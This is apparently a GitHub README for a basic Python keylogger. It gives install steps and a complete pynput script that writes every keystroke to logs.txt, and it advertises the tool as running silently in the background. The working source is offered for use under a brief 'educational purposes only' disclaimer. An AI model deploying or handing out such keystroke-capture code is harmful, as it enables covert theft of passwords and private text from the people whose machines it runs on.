🔑 Keylogger in Python 🖥️
📌 About
This is a basic keylogger built using Python and pynput library. It records all keystrokes and logs them into a file named logs.txt. The keylogger runs in the background and captures both normal and special keys.

🚀 Features
✅ Logs all keystrokes (letters, numbers, and symbols)
✅ Records special keys (Enter, Space, Backspace, etc.)
✅ Stores keystrokes in a log file (logs.txt)
✅ Runs silently in the background
✅ Safe exit by pressing ESC

🛠️ Installation
1️⃣ Clone the Repository:

bash
Copy
Edit
git clone https://github.com/yourusername/keylogger-python.git
cd keylogger-python
2️⃣ Install Dependencies:

bash
Copy
Edit
pip install pynput
3️⃣ Run the Keylogger:

bash
Copy
Edit
python keylogger.py
🛑 How to Stop the Keylogger?
🚀 Press ESC key to safely stop the keylogger.
🛑 Alternatively, use Ctrl + C in the terminal to force stop it.
🔴 If running in the background, end "Python" process via Task Manager.

📜 Code Implementation
python
Copy
Edit
from pynput import keyboard

def on_press(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped!")
        return False  # Stop the listener
    
    with open("logs.txt", "a") as file:
        file.write(f"{key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
⚠️ Disclaimer
🛑 This project is for educational purposes only.
🔴 Unauthorized use of keyloggers is illegal. Use it responsibly.

